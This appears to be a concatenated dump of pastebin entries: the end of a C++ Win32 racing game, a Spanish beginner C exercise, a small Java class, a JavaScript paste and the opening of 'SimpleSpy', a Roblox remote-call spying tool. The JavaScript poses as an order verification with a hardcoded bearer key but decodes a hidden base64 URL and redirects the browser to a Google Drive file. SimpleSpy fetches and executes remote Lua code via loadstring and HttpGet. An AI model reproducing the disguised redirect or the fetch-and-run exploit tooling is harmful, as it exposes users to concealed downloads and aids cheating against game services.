        // Consistent headlight offset, relative to the car's dimensions
        int headlightSize = 10;
        int playerheadlightOffsetX = 10;
        int playerheadlightOffsetY = -CAR_HEIGHT / 2 + 15;  // Adjusted vertical offset
        Ellipse(memDC, -CAR_WIDTH / 2 + playerheadlightOffsetX, playerheadlightOffsetY,
            -CAR_WIDTH / 2 + playerheadlightOffsetX + headlightSize, playerheadlightOffsetY + headlightSize);
        Ellipse(memDC, CAR_WIDTH / 2 - playerheadlightOffsetX - headlightSize, playerheadlightOffsetY,
            CAR_WIDTH / 2 - playerheadlightOffsetX, playerheadlightOffsetY + headlightSize);
        DeleteObject(headlightBrush);
        RestoreDC(memDC, savedDC);
        DeleteObject(redBrush);

        // Draw AI car (blue rectangle)
        // AI Car Rendering
        // Drawing AI's Car and Headlights
                    // Draw AI car (blue rectangle)
        // AI Car Rendering
        // AI Car Rendering
        //O3's fix working best inconsistent padded positioning tho
            // Draw AI car (blue rectangle)
        /* // ----- Draw AI Car (blue rectangle) with rotated transform -----
        HBRUSH blueBrush = CreateSolidBrush(RGB(0, 0, 255));
        SelectObject(memDC, blueBrush);
        int savedDC2 = SaveDC(memDC);  // Save state using a unique variable name
        SetGraphicsMode(memDC, GM_ADVANCED);
        XFORM xform2;
        xform2.eM11 = (FLOAT)cos(aiAngle);
        xform2.eM12 = (FLOAT)sin(aiAngle);
        xform2.eM21 = (FLOAT)-sin(aiAngle);
        xform2.eM22 = (FLOAT)cos(aiAngle);
        xform2.eDx = (FLOAT)aiX + CAR_WIDTH / 2;
        xform2.eDy = (FLOAT)aiY + CAR_HEIGHT / 2;
        SetWorldTransform(memDC, &xform2);
        Rectangle(memDC, -CAR_WIDTH / 2, -CAR_HEIGHT / 2, CAR_WIDTH / 2, CAR_HEIGHT / 2);
        RestoreDC(memDC, savedDC2);
        DeleteObject(blueBrush);

        // ----- Dynamic AI Headlight Positioning -----
        //
        // This solution computes the AI car's nose (front) using its center (cx,cy)
        // and a front vector derived from aiAngle. Note that the ""front distance"" is
        // CAR_HEIGHT/2 when facing up/down (aiAngle == 0 or PI) and CAR_WIDTH/2 when
        // facing right/left (aiAngle == -PI/2 or PI/2). We then move slightly back from
        // the extreme nose by frontMargin, and offset perpendicular (by aiheadlightSeparation)
        // to get the left and right headlight positions.
        //
        // Define parameters (adjust as needed):
        float cx = aiX + CAR_WIDTH / 2.0f;
        float cy = aiY + CAR_HEIGHT / 2.0f;
        float frontMargin = 5.0f;            // Moves headlights slightly inward from the nose
        float aiheadlightSeparation = 10.0f;   // Lateral offset from the nose for each headlight
        int aiheadlightSize = 8;             // Size of the headlight circle

        // Determine the front distance depending on orientation:
        float frontDistance;
        if (aiAngle == 0 || aiAngle == PI)
            frontDistance = CAR_HEIGHT / 2.0f;
        else // aiAngle == -PI/2 or PI/2
            frontDistance = CAR_WIDTH / 2.0f;

        // The default car drawing uses a local coordinate system where the car's nose is at (0, -1)
        // i.e. at (0, -frontDistance). Thus the front vector (rotated) is:
        float noseX = cx + (-sin(aiAngle)) * frontDistance;
        float noseY = cy + (-cos(aiAngle)) * frontDistance;

        // Pull the headlight positions slightly back from the extreme nose using frontMargin:
        float effectiveX = cx + (-sin(aiAngle)) * (frontDistance - frontMargin);
        float effectiveY = cy + (-cos(aiAngle)) * (frontDistance - frontMargin);

        // Compute a perpendicular vector to the front. For a front vector f = (-sin(aiAngle), -cos(aiAngle)),
        // a perpendicular is p = (cos(aiAngle), -sin(aiAngle)). (We use -p for the left headlight.)
        float px = cos(aiAngle);
        float py = -sin(aiAngle);

        // Compute left and right headlight positions by offsetting perpendicular to the front:
        float leftHeadlightX = effectiveX - px * aiheadlightSeparation;
        float leftHeadlightY = effectiveY - py * aiheadlightSeparation;

        float rightHeadlightX = effectiveX + px * aiheadlightSeparation;
        float rightHeadlightY = effectiveY + py * aiheadlightSeparation;

        // Draw the AI headlights using the computed world coordinates:
        HBRUSH aiHeadlightBrush = CreateSolidBrush(RGB(255, 255, 255));
        SelectObject(memDC, aiHeadlightBrush);
        Ellipse(memDC, (int)leftHeadlightX, (int)leftHeadlightY,
            (int)(leftHeadlightX + aiheadlightSize), (int)(leftHeadlightY + aiheadlightSize));
        Ellipse(memDC, (int)rightHeadlightX, (int)rightHeadlightY,
            (int)(rightHeadlightX + aiheadlightSize), (int)(rightHeadlightY + aiheadlightSize));
        DeleteObject(aiHeadlightBrush); */

        //voila! It's working perfectly /w the following dynamic code!!!
        // ----- Draw AI Car (blue rectangle) with rotated transform -----
        {
            HBRUSH blueBrush = CreateSolidBrush(RGB(0, 0, 255));
            SelectObject(memDC, blueBrush);
            int savedDC2 = SaveDC(memDC);  // Save current DC state
            SetGraphicsMode(memDC, GM_ADVANCED);
            XFORM xform2;
            xform2.eM11 = (FLOAT)cos(aiAngle);
            xform2.eM12 = (FLOAT)sin(aiAngle);
            xform2.eM21 = (FLOAT)-sin(aiAngle);
            xform2.eM22 = (FLOAT)cos(aiAngle);
            xform2.eDx = (FLOAT)aiX + CAR_WIDTH / 2;
            xform2.eDy = (FLOAT)aiY + CAR_HEIGHT / 2;
            SetWorldTransform(memDC, &xform2);
            Rectangle(memDC, -CAR_WIDTH / 2, -CAR_HEIGHT / 2, CAR_WIDTH / 2, CAR_HEIGHT / 2);
            RestoreDC(memDC, savedDC2);
            DeleteObject(blueBrush);
        }

        // ----- Dynamically Compute and Draw AI Headlights -----
        //
        // This solution calculates the headlight positions based on the car’s center,
        // a “front” vector (pointing toward the nose) and a perpendicular vector for lateral offset.
        // The idea is that the headlights are placed at a fixed distance (headlightDistance)
        // from the center along the front vector (which is always the nose direction)
        // and then offset left/right by aiheadlightSeparation.
        {
            // Car center
            float cx = aiX + CAR_WIDTH / 2.0f;
            float cy = aiY + CAR_HEIGHT / 2.0f;

            // Parameters – adjust these to fine-tune the look:
            // We use CAR_HEIGHT/2 as the full distance from center to nose when facing up.
            // To mimic the player car’s appearance (headlights slightly inset from the very front),
            // we subtract 15 pixels.
            float headlightDistance = CAR_HEIGHT / 2.0f - 15.0f;
            float aiheadlightSeparation = 10.0f;  // Lateral offset from the center of the nose
            int aiheadlightSize = 8;              // Headlight circle size

            // Compute the ""front"" direction vector.
            // Since the car’s default (unrotated) orientation has its nose at the top,
            // the front vector in local coordinates is (0, -1). Rotating that by aiAngle:
            float frontDirX = -sin(aiAngle);
            float frontDirY = -cos(aiAngle);

            // Determine the headlight “center” position – a point along the nose,
            // but moved slightly inward by headlightDistance:
            float headlightCenterX = cx + frontDirX * headlightDistance;
            float headlightCenterY = cy + frontDirY * headlightDistance;

            // Compute a perpendicular vector to the front.
            // A vector perpendicular to (frontDirX, frontDirY) is given by (cos(aiAngle), -sin(aiAngle)).
            float perpX = cos(aiAngle);
            float perpY = -sin(aiAngle);

            // Compute left and right headlight positions by offsetting the headlight center along the perpendicular.
            float leftHeadlightX = headlightCenterX - perpX * aiheadlightSeparation;
            float leftHeadlightY = headlightCenterY - perpY * aiheadlightSeparation;
            float rightHeadlightX = headlightCenterX + perpX * aiheadlightSeparation;
            float rightHeadlightY = headlightCenterY + perpY * aiheadlightSeparation;

            // Draw the AI headlights using the computed world coordinates:
            HBRUSH aiHeadlightBrush = CreateSolidBrush(RGB(255, 255, 255));
            SelectObject(memDC, aiHeadlightBrush);
            Ellipse(memDC, (int)leftHeadlightX, (int)leftHeadlightY,
                (int)(leftHeadlightX + aiheadlightSize), (int)(leftHeadlightY + aiheadlightSize));
            Ellipse(memDC, (int)rightHeadlightX, (int)rightHeadlightY,
                (int)(rightHeadlightX + aiheadlightSize), (int)(rightHeadlightY + aiheadlightSize));
            DeleteObject(aiHeadlightBrush);
        }





        //original AI code
        /* HBRUSH blueBrush = CreateSolidBrush(RGB(0, 0, 255));
        SelectObject(memDC, blueBrush);
        savedDC = SaveDC(memDC);
        SetGraphicsMode(memDC, GM_ADVANCED);
        XFORM xform2;
        xform2.eM11 = (FLOAT)cos(aiAngle);
        xform2.eM12 = (FLOAT)sin(aiAngle);
        xform2.eM21 = (FLOAT)-sin(aiAngle);
        xform2.eM22 = (FLOAT)cos(aiAngle);
        xform2.eDx = (FLOAT)aiX + CAR_WIDTH / 2;
        xform2.eDy = (FLOAT)aiY + CAR_HEIGHT / 2;
        SetWorldTransform(memDC, &xform2);
        Rectangle(memDC, -CAR_WIDTH / 2, -CAR_HEIGHT / 2, CAR_WIDTH / 2, CAR_HEIGHT / 2);

        HBRUSH aiheadlightBrush = CreateSolidBrush(RGB(255, 255, 255));
        SelectObject(memDC, aiheadlightBrush);
        int aiheadlightSize = 8;

        // Define AI headlight positions based on calculated offsets
        Ellipse(memDC, -CAR_WIDTH / 4 - aiheadlightSize / 2, -CAR_HEIGHT / 2 + 5,
            -CAR_WIDTH / 4 + aiheadlightSize / 2, -CAR_HEIGHT / 2 + 5 + aiheadlightSize);
        Ellipse(memDC, CAR_WIDTH / 4 - aiheadlightSize / 2, -CAR_HEIGHT / 2 + 5,
            CAR_WIDTH / 4 + aiheadlightSize / 2, -CAR_HEIGHT / 2 + 5 + aiheadlightSize);

        DeleteObject(aiheadlightBrush);
        RestoreDC(memDC, savedDC);
        DeleteObject(blueBrush); */

        // Draw countdown timer if game hasn't started
        if (!gameStarted)
        {
            char timerText[10];
            sprintf_s(timerText, ""%d"", timer / 10);
            SetTextColor(memDC, RGB(255, 0, 0));
            SetBkMode(memDC, TRANSPARENT);
            TextOutA(memDC, WIDTH / 2 - 10, HEIGHT / 2 - 10, timerText, strlen(timerText));
        }

        // Draw God Mode text indicator
        if (godMode)
        {
            SetTextColor(memDC, RGB(255, 0, 0));
            SetBkMode(memDC, TRANSPARENT);
            TextOutA(memDC, 10, 10, ""God Mode ON"", 11);
        }

        // Copy from memory DC to screen
        BitBlt(hdc, 0, 0, WIDTH, HEIGHT, memDC, 0, 0, SRCCOPY);

        // Clean up
        SelectObject(memDC, oldBitmap);
        DeleteObject(memBitmap);
        DeleteDC(memDC);

        EndPaint(hWnd, &ps);
        break;
    }
    case WM_DESTROY:
        KillTimer(hWnd, 1);
        PostQuitMessage(0);
        break;
    case WM_KEYDOWN:
        if (wParam == VK_F1)
        {
            MessageBoxW(hWnd, L""2D Racing Game 3.0 Programmed in C++ Win32 API (491 lines of code) by Entisoft Software (c) Evans Thorpemorton"", L""About"", MB_OK | MB_ICONINFORMATION); // orig 395 lines
        }
        //break;
        if (wParam == VK_ESCAPE)
        {
            PostQuitMessage(0);
        }
        break;
    default:
        return DefWindowProc(hWnd, message, wParam, lParam);
    }
    return 0;
}

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow)
{
    // Register window class
    WNDCLASSEX wc = { 0 };
    wc.cbSize = sizeof(WNDCLASSEX);
    wc.style = CS_HREDRAW | CS_VREDRAW;
    wc.lpfnWndProc = WndProc;
    wc.cbClsExtra = 0;
    wc.cbWndExtra = 0;
    wc.hInstance = hInstance;
    wc.hIcon = LoadIcon(hInstance, MAKEINTRESOURCE(IDI_ICON1));        // Modified line
    //wc.hIcon = LoadIcon(NULL, IDI_APPLICATION);
    wc.hCursor = LoadCursor(NULL, IDC_ARROW);
    wc.hbrBackground = (HBRUSH)(COLOR_WINDOW + 1);
    wc.lpszMenuName = NULL;
    wc.lpszClassName = L""RacingGame"";
    wc.hIconSm = (HICON)LoadImage(hInstance,                           // Modified line
        MAKEINTRESOURCE(IDI_ICON1),           // Modified line
        IMAGE_ICON,                           // Modified line
        16,                                   // Modified line
        16,                                   // Modified line
        LR_DEFAULTCOLOR);                     // Modified line
    //wc.hIconSm = LoadIcon(NULL, IDI_APPLICATION);
    RegisterClassEx(&wc);

    // Calculate the position to center the window
    int screenWidth = GetSystemMetrics(SM_CXSCREEN);
    int screenHeight = GetSystemMetrics(SM_CYSCREEN);
    int windowX = (screenWidth - WIDTH) / 2;
    int windowY = (screenHeight - HEIGHT) / 2;

    // Create window
    HWND hWnd = CreateWindowEx(0, L""RacingGame"", L""Racing Game (ArrowKeys=Move G=GodMode)"", WS_OVERLAPPEDWINDOW, windowX, windowY, WIDTH, HEIGHT, NULL, NULL, hInstance, NULL);

    // Show window
    //ShowWindow(hWnd, nCmdShow);
    ShowWindow(hWnd, SW_SHOWMAXIMIZED);

    // Main loop
    MSG msg = { 0 };
    while (GetMessage(&msg, NULL, 0, 0))
    {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }

    return 0;
}
```"
vLmWduF8,Untitled,robloxhack212,JavaScript,Monday 31st of March 2025 08:04:19 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/351/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
xEpKRMRb,Clase 31-3-25,Aluneth,C,Monday 31st of March 2025 07:55:37 AM CDT,"#include <stdio.h>
#include <stdlib.h>

/*int main()
{

    int sueldo;
    printf(""Ingrese un sueldo: "");
    scanf(""%d"", &sueldo);
    if (sueldo > 3000) {
        printf(""\nDebe abonar impuestos\n"");
    };


    //printf(""Hello world!\n"");
    return 0;
}
*/


/* int main ()
{
    int num1, num2;
    printf(""Ingrese un numero: "");
    scanf(""%d"", &num1);
    printf(""Ingrese otro numero: "");
    scanf(""%d"", &num2);

    if (num1 > num2)
    {

        printf(""El primer numero es el mayor: %d"", num1);
    }
    else
{
    printf(""El segundo numero es el mayor: %d"", num2);
    }

    return 0;
} */


/* int main ()
{
    int numero;
    printf(""Ingrese un numero entero positivo entre 1 y 99: "");
    scanf(""%d"", &numero);

    if (numero < 1 || numero > 99)
    {
        printf(""El numero no esta entre 1 y 99"");
    }
    else if (numero < 10 )
    {
        printf(""El numero tiene una sola cifra"");

    }
    else
    {

        printf(""El numero tiene dos cifras"");
    }


    return 0;
} */


/* Confeccionar un programa que pida por teclado tres notas de un alumno, calcule el promedio e imprima alguno de estos mensajes:
Si el promedio es >=7 mostrar ""Promocionado"".
Si el promedio es >=4 y <7 mostrar ""Regular"".
Si el promedio es <4 mostrar ""Reprobado"". */
/* int main ()
{


    int nota1, nota2, nota3;
    float promedio;
    printf(""Ingrese las 3 notas del alumno\n"");
    printf(""Nota 1: "");
    scanf(""%d"", &nota1);
    printf(""Nota 2: "");
    scanf(""%d"", &nota2);
    printf(""Nota 3: "");
    scanf(""%d"", &nota3);

    promedio = (nota1 + nota2 + nota3) / 3;

    if (promedio < 4)
    {
        printf(""Reprobado"");
    }
    else
    {
        if (promedio < 7)
            printf(""Regular"");
        else
        {

            printf(""Promocionado"");
        }
    }
    return 0;

} */


/* int main ()
{
    int num1, num2, num3;
    printf(""Ingrese el numero 1: "");
    scanf(""%d"", &num1);
    printf(""Ingrese el numero 2: "");
    scanf(""%d"", &num2);
    printf(""Ingrese el numero 3: "");
    scanf(""%d"", &num3);

    if (num1 > num2)
    {
        if (num1 > num3)
        {
            printf(""El numero mayor es: %d"", num1);
        }
    }
    else
    {
        if (num2 > num3)
        {
            printf(""El numero mayor es: %d"", num2);
        }
        else
        {
            printf(""El numero mayor es: %d"", num3);
        }

    }


    return 0;
} */

/* Un postulante a un empleo, realiza un test de capacitación, se obtuvo la siguiente información: cantidad
total de preguntas que se le realizaron y la cantidad de preguntas que contestó correctamente. Se pide
confeccionar un programa que ingrese los dos datos por teclado e informe el nivel del mismo según el porcentaje
de respuestas correctas que ha obtenido, y sabiendo que:

	Nivel máximo:	Porcentaje>=90%.
	Nivel medio:	Porcentaje>=75% y <90%.
	Nivel regular:	Porcentaje>=50% y <75%.
	Fuera de nivel:	Porcentaje<50%. */


int main()
{
    int preguntas, resCorrectas;
    float porcentaje;
    printf(""Cantidad de preguntas totales: "");
    scanf(""%d"", &preguntas);
    printf(""Cantidad de respuestas correctas: "");
    scanf(""%d"", &resCorrectas);

    porcentaje = resCorrectas * 100 / preguntas ;

    if (porcentaje >= 90)
    {
        printf(""Nivel maximo: %.2f"", porcentaje);
    }
    else
    {
        if (porcentaje >= 75)
        {
            printf(""Nivel medio: %.2f"", porcentaje);
        }

        else if (porcentaje >= 50)
        {
            printf(""Nivel regular: %.2f"", porcentaje);
        }
        else
        {
            printf(""Fuera de nivel: %.2f"", porcentaje);
        }
    }
    return 0;
}

"
i6W9vhs0,samson.java,Delta_Sierra,Java,Monday 31st of March 2025 07:33:35 AM CDT,"public class samson{
    static void Samson_Object(){
        int num = 5;
        if(num < 10){
            System.out.println(""The Number is less than 10."");
            }else{
            System.out.println(""The Number is Greater than 10."");
            }
    }
    public static void main(String []args){
        Samson_Object();
    }
}"
tEzyvMs2,Untitled,NukeVsCity,Lua,Monday 31st of March 2025 07:33:00 AM CDT,"--[[
    SimpleSpy v2.2 SOURCE

    SimpleSpy is a lightweight penetration testing tool that logs remote calls.

    Credits:
        exx - basically everything
        Frosty - GUI to Lua
]]

-- shuts down the previous instance of SimpleSpy
if _G.SimpleSpyExecuted and type(_G.SimpleSpyShutdown) == ""function"" then
	print(pcall(_G.SimpleSpyShutdown))
end

local Players = game:GetService(""Players"")
local CoreGui = game:GetService(""CoreGui"")
local Highlight =
	loadstring(
		game:HttpGet(""https://github.com/exxtremestuffs/SimpleSpySource/raw/master/highlight.lua"")
	)()

---- GENERATED (kinda sorta mostly) BY GUI to LUA ----

-- Instances:

local SimpleSpy2 = Instance.new(""ScreenGui"")
local Background = Instance.new(""Frame"")
local LeftPanel = Instance.new(""Frame"")
local LogList = Instance.new(""ScrollingFrame"")
local UIListLayout = Instance.new(""UIListLayout"")
local RemoteTemplate = Instance.new(""Frame"")
local ColorBar = Instance.new(""Frame"")
local Text = Instance.new(""TextLabel"")
local Button = Instance.new(""TextButton"")
local RightPanel = Instance.new(""Frame"")
local CodeBox = Instance.new(""Frame"")
local ScrollingFrame = Instance.new(""ScrollingFrame"")
local UIGridLayout = Instance.new(""UIGridLayout"")
local FunctionTemplate = Instance.new(""Frame"")
local ColorBar_2 = Instance.new(""Frame"")
local Text_2 = Instance.new(""TextLabel"")
local Button_2 = Instance.new(""TextButton"")
local TopBar = Instance.new(""Frame"")
local Simple = Instance.new(""TextButton"")
local CloseButton = Instance.new(""TextButton"")
local ImageLabel = Instance.new(""ImageLabel"")
local MaximizeButton = Instance.new(""TextButton"")
local ImageLabel_2 = Instance.new(""ImageLabel"")
local MinimizeButton = Instance.new(""TextButton"")
local ImageLabel_3 = Instance.new(""ImageLabel"")
local ToolTip = Instance.new(""Frame"")
local TextLabel = Instance.new(""TextLabel"")

--Properties:

SimpleSpy2.Name = ""SimpleSpy2""
SimpleSpy2.ResetOnSpawn = false

Background.Name = ""Background""
Background.Parent = SimpleSpy2
Background.BackgroundColor3 = Color3.new(1, 1, 1)
Background.BackgroundTransparency = 1
Background.Position = UDim2.new(0, 500, 0, 200)
Background.Size = UDim2.new(0, 450, 0, 268)

LeftPanel.Name = ""LeftPanel""
LeftPanel.Parent = Background
LeftPanel.BackgroundColor3 = Color3.fromRGB(53, 52, 55)
LeftPanel.BorderSizePixel = 0
LeftPanel.Position = UDim2.new(0, 0, 0, 19)
LeftPanel.Size = UDim2.new(0, 131, 0, 249)

LogList.Name = ""LogList""
LogList.Parent = LeftPanel
LogList.Active = true
LogList.BackgroundColor3 = Color3.new(1, 1, 1)
LogList.BackgroundTransparency = 1
LogList.BorderSizePixel = 0
LogList.Position = UDim2.new(0, 0, 0, 9)
LogList.Size = UDim2.new(0, 131, 0, 232)
LogList.CanvasSize = UDim2.new(0, 0, 0, 0)
LogList.ScrollBarThickness = 4

UIListLayout.Parent = LogList
UIListLayout.HorizontalAlignment = Enum.HorizontalAlignment.Center
UIListLayout.SortOrder = Enum.SortOrder.LayoutOrder

RemoteTemplate.Name = ""RemoteTemplate""
RemoteTemplate.Parent = LogList
RemoteTemplate.BackgroundColor3 = Color3.new(1, 1, 1)
RemoteTemplate.BackgroundTransparency = 1
RemoteTemplate.Size = UDim2.new(0, 117, 0, 27)

ColorBar.Name = ""ColorBar""
ColorBar.Parent = RemoteTemplate
ColorBar.BackgroundColor3 = Color3.fromRGB(255, 242, 0)
ColorBar.BorderSizePixel = 0
ColorBar.Position = UDim2.new(0, 0, 0, 1)
ColorBar.Size = UDim2.new(0, 7, 0, 18)
ColorBar.ZIndex = 2

Text.Name = ""Text""
Text.Parent = RemoteTemplate
Text.BackgroundColor3 = Color3.new(1, 1, 1)
Text.BackgroundTransparency = 1
Text.Position = UDim2.new(0, 12, 0, 1)
Text.Size = UDim2.new(0, 105, 0, 18)
Text.ZIndex = 2
Text.Font = Enum.Font.SourceSans
Text.Text = ""TEXT""
Text.TextColor3 = Color3.new(1, 1, 1)
Text.TextSize = 14
Text.TextXAlignment = Enum.TextXAlignment.Left
Text.TextWrapped = true

Button.Name = ""Button""
Button.Parent = RemoteTemplate
Button.BackgroundColor3 = Color3.new(0, 0, 0)
Button.BackgroundTransparency = 0.75
Button.BorderColor3 = Color3.new(1, 1, 1)
Button.Position = UDim2.new(0, 0, 0, 1)
Button.Size = UDim2.new(0, 117, 0, 18)
Button.AutoButtonColor = false
Button.Font = Enum.Font.SourceSans
Button.Text = """"
Button.TextColor3 = Color3.new(0, 0, 0)
Button.TextSize = 14

RightPanel.Name = ""RightPanel""
RightPanel.Parent = Background
RightPanel.BackgroundColor3 = Color3.fromRGB(37, 36, 38)
RightPanel.BorderSizePixel = 0
RightPanel.Position = UDim2.new(0, 131, 0, 19)
RightPanel.Size = UDim2.new(0, 319, 0, 249)

CodeBox.Name = ""CodeBox""
CodeBox.Parent = RightPanel
CodeBox.BackgroundColor3 = Color3.new(0.0823529, 0.0745098, 0.0784314)
CodeBox.BorderSizePixel = 0
CodeBox.Size = UDim2.new(0, 319, 0, 119)

ScrollingFrame.Parent = RightPanel
ScrollingFrame.Active = true
ScrollingFrame.BackgroundColor3 = Color3.new(1, 1, 1)
ScrollingFrame.BackgroundTransparency = 1
ScrollingFrame.Position = UDim2.new(0, 0, 0.5, 0)
ScrollingFrame.Size = UDim2.new(1, 0, 0.5, -9)
ScrollingFrame.CanvasSize = UDim2.new(0, 0, 0, 0)
ScrollingFrame.ScrollBarThickness = 4

UIGridLayout.Parent = ScrollingFrame
UIGridLayout.HorizontalAlignment = Enum.HorizontalAlignment.Center
UIGridLayout.SortOrder = Enum.SortOrder.LayoutOrder
UIGridLayout.CellPadding = UDim2.new(0, 0, 0, 0)
UIGridLayout.CellSize = UDim2.new(0, 94, 0, 27)

FunctionTemplate.Name = ""FunctionTemplate""
FunctionTemplate.Parent = ScrollingFrame
FunctionTemplate.BackgroundColor3 = Color3.new(1, 1, 1)
FunctionTemplate.BackgroundTransparency = 1
FunctionTemplate.Size = UDim2.new(0, 117, 0, 23)

ColorBar_2.Name = ""ColorBar""
ColorBar_2.Parent = FunctionTemplate
ColorBar_2.BackgroundColor3 = Color3.new(1, 1, 1)
ColorBar_2.BorderSizePixel = 0
ColorBar_2.Position = UDim2.new(0, 7, 0, 10)
ColorBar_2.Size = UDim2.new(0, 7, 0, 18)
ColorBar_2.ZIndex = 3

Text_2.Name = ""Text""
Text_2.Parent = FunctionTemplate
Text_2.BackgroundColor3 = Color3.new(1, 1, 1)
Text_2.BackgroundTransparency = 1
Text_2.Position = UDim2.new(0, 19, 0, 10)
Text_2.Size = UDim2.new(0, 69, 0, 18)
Text_2.ZIndex = 2
Text_2.Font = Enum.Font.SourceSans
Text_2.Text = ""TEXT""
Text_2.TextColor3 = Color3.new(1, 1, 1)
Text_2.TextSize = 14
Text_2.TextStrokeColor3 = Color3.new(0.145098, 0.141176, 0.14902)
Text_2.TextXAlignment = Enum.TextXAlignment.Left
Text_2.TextWrapped = true

Button_2.Name = ""Button""
Button_2.Parent = FunctionTemplate
Button_2.BackgroundColor3 = Color3.new(0, 0, 0)
Button_2.BackgroundTransparency = 0.69999998807907
Button_2.BorderColor3 = Color3.new(1, 1, 1)
Button_2.Position = UDim2.new(0, 7, 0, 10)
Button_2.Size = UDim2.new(0, 80, 0, 18)
Button_2.AutoButtonColor = false
Button_2.Font = Enum.Font.SourceSans
Button_2.Text = """"
Button_2.TextColor3 = Color3.new(0, 0, 0)
Button_2.TextSize = 14

TopBar.Name = ""TopBar""
TopBar.Parent = Background
TopBar.BackgroundColor3 = Color3.fromRGB(37, 35, 38)
TopBar.BorderSizePixel = 0
TopBar.Size = UDim2.new(0, 450, 0, 19)

Simple.Name = ""Simple""
Simple.Parent = TopBar
Simple.BackgroundColor3 = Color3.new(1, 1, 1)
Simple.AutoButtonColor = false
Simple.BackgroundTransparency = 1
Simple.Position = UDim2.new(0, 5, 0, 0)
Simple.Size = UDim2.new(0, 57, 0, 18)
Simple.Font = Enum.Font.SourceSansBold
Simple.Text = ""SimpleSpy""
Simple.TextColor3 = Color3.new(1, 1, 1)
Simple.TextSize = 14
Simple.TextXAlignment = Enum.TextXAlignment.Left

CloseButton.Name = ""CloseButton""
CloseButton.Parent = TopBar
CloseButton.BackgroundColor3 = Color3.new(0.145098, 0.141176, 0.14902)
CloseButton.BorderSizePixel = 0
CloseButton.Position = UDim2.new(1, -19, 0, 0)
CloseButton.Size = UDim2.new(0, 19, 0, 19)
CloseButton.Font = Enum.Font.SourceSans
CloseButton.Text = """"
CloseButton.TextColor3 = Color3.new(0, 0, 0)
CloseButton.TextSize = 14

ImageLabel.Parent = CloseButton
ImageLabel.BackgroundColor3 = Color3.new(1, 1, 1)
ImageLabel.BackgroundTransparency = 1
ImageLabel.Position = UDim2.new(0, 5, 0, 5)
ImageLabel.Size = UDim2.new(0, 9, 0, 9)
ImageLabel.Image = ""http://www.roblox.com/asset/?id=5597086202""

MaximizeButton.Name = ""MaximizeButton""
MaximizeButton.Parent = TopBar
MaximizeButton.BackgroundColor3 = Color3.new(0.145098, 0.141176, 0.14902)
MaximizeButton.BorderSizePixel = 0
MaximizeButton.Position = UDim2.new(1, -38, 0, 0)
MaximizeButton.Size = UDim2.new(0, 19, 0, 19)
MaximizeButton.Font = Enum.Font.SourceSans
MaximizeButton.Text = """"
MaximizeButton.TextColor3 = Color3.new(0, 0, 0)
MaximizeButton.TextSize = 14

ImageLabel_2.Parent = MaximizeButton
ImageLabel_2.BackgroundColor3 = Color3.new(1, 1, 1)
ImageLabel_2.BackgroundTransparency = 1
ImageLabel_2.Position = UDim2.new(0, 5, 0, 5)
ImageLabel_2.Size = UDim2.new(0, 9, 0, 9)
ImageLabel_2.Image = ""http://www.roblox.com/asset/?id=5597108117""

MinimizeButton.Name = ""MinimizeButton""
MinimizeButton.Parent = TopBar
MinimizeButton.BackgroundColor3 = Color3.new(0.145098, 0.141176, 0.14902)
MinimizeButton.BorderSizePixel = 0
MinimizeButton.Position = UDim2.new(1, -57, 0, 0)
MinimizeButton.Size = UDim2.new(0, 19, 0, 19)
MinimizeButton.Font = Enum.Font.SourceSans
MinimizeButton.Text = """"
MinimizeButton.TextColor3 = Color3.new(0, 0, 0)
MinimizeButton.TextSize = 14

ImageLabel_3.Parent = MinimizeButton
ImageLabel_3.BackgroundColor3 = Color3.new(1, 1, 1)
ImageLabel_3.BackgroundTransparency = 1
ImageLabel_3.Position = UDim2.new(0, 5, 0, 5)
ImageLabel_3.Size = UDim2.new(0, 9, 0, 9)
ImageLabel_3.Image = ""http://www.roblox.com/asset/?id=5597105827""

ToolTip.Name = ""ToolTip""
ToolTip.Parent = SimpleSpy2
ToolTip.BackgroundColor3 = Color3.fromRGB(26, 26, 26)
ToolTip.BackgroundTransparency = 0.1
ToolTip.BorderColor3 = Color3.new(1, 1, 1)
ToolTip.Size = UDim2.new(0, 200, 0, 50)
ToolTip.ZIndex = 3
ToolTip.Visible = false

TextLabel.Parent = ToolTip
TextLabel.BackgroundColor3 = Color3.new(1, 1, 1)
TextLabel.BackgroundTransparency = 1
TextLabel.Position = UDim2.new(0, 2, 0, 2)
TextLabel.Size = UDim2.new(0, 196, 0, 46)
TextLabel.ZIndex = 3
TextLabel.Font = Enum.Font.SourceSans
TextLabel.Text = ""This is some slightly longer text.""
TextLabel.TextColor3 = Color3.new(1, 1, 1)
TextLabel.TextSize = 14
TextLabel.TextWrapped = true
TextLabel.TextXAlignment = Enum.TextXAlignment.Left
TextLabel.TextYAlignment = Enum.TextYAlignment.Top

-------------------------------------------------------------------------------
-- init
local RunService = game:GetService(""RunService"")
local UserInputService = game:GetService(""UserInputService"")
local TweenService = game:GetService(""TweenService"")
local ContentProvider = game:GetService(""ContentProvider"")
local TextService = game:GetService(""TextService"")
local Mouse

local selectedColor = Color3.new(0.321569, 0.333333, 1)
local deselectedColor = Color3.new(0.8, 0.8, 0.8)
--- So things are descending
local layoutOrderNum = 999999999
--- Whether or not the gui is closing
local mainClosing = false
--- Whether or not the gui is closed (defaults to false)
local closed = false
--- Whether or not the sidebar is closing
local sideClosing = false
--- Whether or not the sidebar is closed (defaults to true but opens automatically on remote selection)
local sideClosed = false
